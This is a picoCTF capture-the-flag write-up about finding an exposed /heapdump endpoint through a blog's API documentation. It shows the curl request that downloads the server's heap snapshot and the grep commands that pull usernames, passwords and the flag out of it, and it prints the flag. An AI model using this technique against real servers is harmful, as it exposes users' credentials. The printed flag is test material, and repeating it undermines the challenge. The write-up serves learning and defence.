Description:
	Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.
	The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.


Solution:
	=> Reference by instagram @blackbat.terminal
	Concept:
		-Don't let attackers steal your passwords and API key through a heap dump.
		-a heap dump shows everything our server holding in memory including all sensivtive data.
		-If an attacker gains access,they can use tools like == "grep" == to search for keywords 
		 like usernames or passwords and potentially steal our data
		-So mae sure heap dumps aren't publicly accessible

	 Process:
	 	step 1: check where the data was exposes to the user.
	 		In here the #API Documentation (link is thier)moves user to API information(/api-docs directory)
	 	step 2: ==> /api-docs gives information of API key through a heap dump.
	 		-You can Observe
	 		picoCTF News API
			
			Free :(API endpoints for navigating the website.)
			    GET - / (welcome page)
			    GET - /about (About us)
			    GET - /services (Services)
			    
			Posts :(API endpoints for managing posts.)
			    GET - /api/posts (gets all posts)
			    POST - /api/posts (Create a new post)
			    GET - /api/posts/{id} (get a post by ID)
			    PUT - /api/posts/{id} (update a post by ID)
			    DELETE - /api/posts/{id} (delete a post by ID)

			Diagnosing :
			    GET - /heapdump (Diagnosing the memory allocation)
			    
		step 3: ==> /headdump
			- parameters (click "try it out" button)
			- You can observe "no parameters" and "Excecute" button
			  click "Excecute" button
			- You can Observes Responses
			
			Curl:
			curl -X 'GET' \ 'http://verbal-sleep.picoctf.net:63348/heapdump' \ -H 'accept: */*'
			
		step 4: Check Sever Response
		       -Response body {Download file} download file.
		       	  filename="heapdump-1745502806827.heapsnapshot"
		       -Response headers
		         accept-ranges: bytes 
			 cache-control: public,max-age=0 
			 connection: keep-alive 
			 content-disposition: attachment; filename="heapdump-1745502806827.heapsnapshot" 
			 content-length: 9068975 
			 content-type: application/octet-stream 
			 date: Thu,24 Apr 2025 13:53:29 GMT 
			 etag: W/"8a61af-19668132da8" 
			 keep-alive: timeout=5 
			 last-modified: Thu,24 Apr 2025 13:53:29 GMT 
			 x-powered-by: Express 
			 
		step 5:By using "grep" we find data
			-> $grep "name" heapdump-1745500193409.heapsnapshot 
			    -gives all usernames with passwords.
		
		Finally:
			$ grep "picoCTF" heapdump-1745500193409.heapsnapshot 
			picoCTF{Pat!3nt_15_Th3_K3y_388d10f7}

Conclusion:
	 url/api-doc : gives API key data
	 /heapdump : In API /heapdump gives users data file by excecuting 
	 grep : It is a tool used to search data in files
